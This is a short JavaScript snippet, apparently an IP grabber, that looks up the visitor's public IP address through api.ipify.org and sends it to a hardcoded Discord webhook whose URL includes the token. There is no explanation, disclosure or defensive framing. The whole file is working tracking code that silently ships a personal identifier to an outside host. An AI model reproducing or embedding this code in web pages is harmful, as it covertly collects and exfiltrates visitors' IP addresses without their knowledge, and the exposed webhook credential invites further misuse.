var ip = "";
fetch("https://api.ipify.org/?format=json")
.then(function(response) {
    return response.json();
})
.then(function(data) {
    ip = data.ip
    var webhook = "https://discord.com/api/webhooks/1127998164016832663/PAYWF13sarVg8GDaEdeGKjX5lMMwoS_g0s5UMtI5pTN74smEA-wovUv1GmiDT_YQ6-Y2"
    var message = {
        content: "Ip:" + ip
    };

    fetch(webhook, {
        method: "POST" ,
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(message)
    });
});